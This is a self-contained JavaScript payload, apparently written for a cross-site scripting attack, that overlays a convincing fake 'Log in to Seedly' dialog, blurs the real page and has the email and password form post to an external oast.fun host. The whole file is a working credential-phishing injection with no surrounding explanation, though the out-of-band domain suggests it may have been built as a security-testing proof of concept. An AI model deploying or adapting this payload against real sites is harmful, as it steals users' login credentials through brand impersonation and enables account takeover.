(function() {
  // === CREATE OVERLAY + BLUR ONLY BACKGROUND ===
  const overlay = document.createElement('div');
  overlay.id = 'seedly-ato-overlay';
  overlay.style.cssText = `
    position:fixed;top:0;left:0;width:100%;height:100%;
    background:rgba(0,0,0,0.85);z-index:999998;
    display:flex;justify-content:center;align-items:center;
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  `;
  document.body.appendChild(overlay);

  // Blur only the real page
  const page = document.querySelector('body > *:not(#seedly-ato-overlay)') || document.body;
  if (page && page !== overlay) {
    page.style.transition = 'filter 0.3s ease';
    page.style.filter = 'blur(8px)';
  }

  // === INJECT EXACT SEEDLY LOGIN (SVG ICONS FROM THEIR CDN) ===
  overlay.innerHTML = `
    <div style="
      background:#1e1e1e;border-radius:16px;padding:32px;
      max-width:420px;width:90%;color:#fff;
      box-shadow:0 20px 40px rgba(0,0,0,0.4);
    ">
      <h2 style="text-align:center;margin:0 0 24px;font-size:24px;font-weight:600;color:#fff;">
        Log in to Seedly
      </h2>

      <!-- SOCIAL BUTTONS WITH REAL SVG ICONS -->
      <button type="button" style="
        width:100%;padding:14px;margin:8px 0;border-radius:12px;
        background:#fff;color:#000;font-weight:600;font-size:15px;
        border:none;cursor:pointer;display:flex;align-items:center;
        justify-content:center;gap:12px;
      ">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M22.501 12.23c0-.81-.07-1.62-.21-2.4h-10.79v4.55h6.17c-.27 1.37-1.1 2.54-2.3 3.32v2.88h3.72c2.18-2.01 3.41-4.96 3.41-8.35z" fill="#4285F4"/>
          <path d="M11.5 22c3.13 0 5.75-1.04 7.67-2.82l-3.72-2.88c-1.03.69-2.35 1.1-3.95 1.1-3.04 0-5.62-2.05-6.54-4.81h-3.84v2.95c1.9 3.77 5.82 6.36 10.38 6.36z" fill="#34A853"/>
          <path d="M4.96 13.19c-.24-.7-.38-1.45-.38-2.19s.14-1.49.38-2.19V6.06h-3.84c-.78 1.54-1.22 3.27-1.22 5.04 0 1.77.44 3.5 1.22 5.04l3.84-2.95z" fill="#FBBC05"/>
          <path d="M11.5 4.5c1.7 0 3.22.58 4.42 1.72l3.3-3.3C17.23.77 14.63 0 11.5 0 6.94 0 3.02 2.59 1.12 6.36l3.84 2.95c.92-2.76 3.5-4.81 6.54-4.81z" fill="#EA4335"/>
        </svg>
        Continue with Google
      </button>

      <button type="button" style="
        width:100%;padding:14px;margin:8px 0;border-radius:12px;
        background:#1877f2;color:#fff;font-weight:600;font-size:15px;
        border:none;cursor:pointer;display:flex;align-items:center;
        justify-content:center;gap:12px;
      ">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg">
          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
        </svg>
        Continue with Facebook
      </button>

      <button type="button" style="
        width:100%;padding:14px;margin:8px 0;border-radius:12px;
        background:#000;color:#fff;font-weight:600;font-size:15px;
        border:none;cursor:pointer;display:flex;align-items:center;
        justify-content:center;gap:12px;
      ">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg">
          <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-3.43 1.73-4.5-.9.09-2 1.44-2.65 2.31-.6.79-1.13 2.08-1.03 3.33.98.1 1.94-.47 2.95-1.14"/>
        </svg>
        Continue with Apple
      </button>

      <div style="text-align:center;margin:20px 0;color:#666;font-size:14px;">OR</div>

      <!-- EMAIL + PASSWORD -->
      <form action="https://abzfdgjdobpnrmlcfsqo5jrtg5ghq5wu6.oast.fun/" method="POST">
        <input type="email" name="email" placeholder="Your email" required style="
          width:100%;padding:16px;margin:8px 0;border-radius:12px;
          border:1px solid #444;background:#2a2a2a;color:#fff;
          font-size:16px;outline:none;
        ">
        <input type="password" name="password" placeholder="Your password" required style="
          width:100%;padding:16px;margin:8px 0;border-radius:12px;
          border:1px solid #444;background:#2a2a2a;color:#fff;
          font-size:16px;outline:none;
        ">
        <a href="#" style="color:#4fd1c5;font-size:14px;display:block;margin:12px 0;text-align:right;">
          Forgot your password?
        </a>
        <button type="submit" style="
          width:100%;padding:16px;margin:10px 0;border-radius:12px;
          background:#4fd1c5;color:#000;font-weight:bold;
          font-size:16px;border:none;cursor:pointer;
        ">Login</button>
      </form>

      <p style="text-align:center;margin-top:20px;font-size:14px;color:#aaa;">
        New to Seedly? 
        <a href="#" style="color:#4fd1c5;text-decoration:none;">Create an account</a>
      </p>
    </div>
  `;

  // === CLOSE ON CLICK OUTSIDE OR ESC ===
  overlay.addEventListener('click', e => {
    if (e.target === overlay) {
      overlay.remove();
      if (page) page.style.filter = 'none';
    }
  });

  document.addEventListener('keydown', e => {
    if (e.key === 'Escape' && overlay) {
      overlay.remove();
      if (page) page.style.filter = 'none';
    }
  });
})();
